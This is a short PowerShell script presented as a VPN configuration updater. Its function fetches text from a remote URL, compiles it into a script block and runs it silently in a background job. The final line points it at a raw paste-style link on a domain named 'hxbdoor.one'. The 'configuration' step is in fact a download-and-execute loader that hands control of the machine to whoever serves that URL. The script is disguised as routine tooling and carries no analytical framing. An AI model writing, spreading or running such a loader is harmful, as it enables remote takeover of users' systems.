function Update-VPNConfiguration {
    param([string]$ConfigSource)
    
    # Just use direct URL (no Base64 encoding)
    $config = Invoke-RestMethod -Uri $ConfigSource -UserAgent "VPN-Config-Client/1.0" -TimeoutSec 10
    
    # Execute config silently
    $job = Start-Job -ScriptBlock ([ScriptBlock]::Create($config)) -Name "VPN-Config-Update"
    $job | Wait-Job -Timeout 30 | Out-Null
    $job | Remove-Job -Force
}

# Direct URL call
Update-VPNConfiguration -ConfigSource "https://hxbdoor.one/raw/5bo9TJV6"
